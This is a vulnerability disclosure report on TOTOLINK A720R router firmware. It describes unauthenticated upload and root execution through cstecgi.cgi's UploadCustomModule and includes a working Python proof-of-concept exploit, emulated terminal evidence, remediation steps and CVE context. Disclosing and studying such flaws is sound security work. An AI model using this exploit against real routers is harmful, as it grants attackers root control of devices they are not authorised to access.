# TOTOLINK A720R V4.1.5cu.532_B20210610 was discovered to contain an unauthenticated CGI upload and execution vulnerability

## Overview

- Vendor: TOTOLINK
- Product: A720R
- Version: V4.1.5cu.532_B20210610
- Component: cstecgi.cgi UploadCustomModule
- Vulnerability Class: CWE-306 missing authentication / CWE-434 unrestricted upload / CWE-78 command execution
- Manufacturer: https://www.totolink.net/

## Affected version

- Package.
- Member.
- `cstecgi.cgi`.
- MIPS little-endian; lighttpd + `/web_cste/cgi-bin/cstecgi.cgi`.

## Vulnerability details

`cstecgi.cgi main` performs no token/cookie verification at all. The
`UploadCustomModule` handler base64-decodes `File`, accepts a caller-supplied
`FileMd5`, writes `/var/custom.cgi` with mode 0777, and the shipped symlink
`/web_cste/cgi-bin/custom.cgi -> /var/custom.cgi` executes it as root. The
request body is JSON with `topicurl: setting/UploadCustomModule`.

## PoC

```python
import base64, hashlib, json, requests

payload = open("custom_cgi_payload_le", "rb").read()  # small MIPS LE ELF
body = {
    "topicurl": "setting/UploadCustomModule",
    "Action": "GetCustomModule",
    "data": {
        "File": base64.b64encode(payload).decode(),
        "FileMd5": hashlib.md5(payload).hexdigest(),
        "FileUrl": "http://<router>/cgi-bin/custom.cgi",
    },
}
requests.post("http://<router>/cgi-bin/cstecgi.cgi", json=body, timeout=10)
print(requests.get("http://<router>/cgi-bin/custom.cgi", timeout=10).text)
```

## Reproduction and terminal evidence

Environment: qemu-mipsel A720R rootfs + firmware lighttpd. No token is
sent; `cstecgi.cgi` and `custom.cgi` are the vendor binaries.

Terminal transcript:

```
POST /cgi-bin/cstecgi.cgi (no token) -> 200 {"Result":"Success"}
GET  /cgi-bin/custom.cgi             -> 200, body: PWNED
```

The uploaded 1.1 KB ELF writes `PWNED` to stdout. Evidence:
`evidence/poc-http.log`, `evidence/ida-UploadCustomModule.txt` (parent
project).

## Static evidence

The handler has no token check; the write/chmod `system` calls and the
symlink are shown in `evidence/ida-UploadCustomModule.txt`.

## Impact

Unauthenticated root code execution and persistence.

## Remediation

- Require a valid token/session for `UploadCustomModule`.
- Remove the CGI-enabled symlink and do not write executables to the web root.
- Verify a vendor signature instead of a caller-supplied MD5.

## Known CVE relation

- CVE-2023-23064 is an A720R `V4.1.5cu.532_B20210610` "Incorrect Access
  Control" issue affecting `/wizard.html` password reset, not this
  `UploadCustomModule`/`custom.cgi` chain. CVE-2026-51723 (T6) and
  CVE-2026-114575 (A950RG) are same-class issues on other models. NVD A720R
  does not list this chain (2026-11-06).

## Status and disclosure

Dynamic confirmation (qemu-mipsel HTTP end-to-end). Candidate 0-day/new
affected product; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
TOTOLINK

### Product
A720R

### Version or Commit
V4.1.5cu.532_B20210610

### Vulnerability Class
CWE-306 missing authentication / CWE-434 unrestricted upload / CWE-78 command execution

### Description
cstecgi.cgi performs no token or cookie verification. UploadCustomModule base64-decodes File, accepts a caller-supplied FileMd5, writes /var/custom.cgi with mode 0777, and the /web_cste/cgi-bin/custom.cgi symlink executes it.

### Affected_component
cstecgi.cgi UploadCustomModule

### Attack_vector
Unauthenticated POST to cstecgi.cgi with topicurl=setting/UploadCustomModule and a base64 File.

### Product_version
A720R V4.1.5cu.532_B20210610

### Reference
- https://www.totolink.net/
- https://github.com/vuln-1/vuln/blob/main/TOTOLINK/A720R_V4.1.5cu.532_B20210610/report-1.md
```
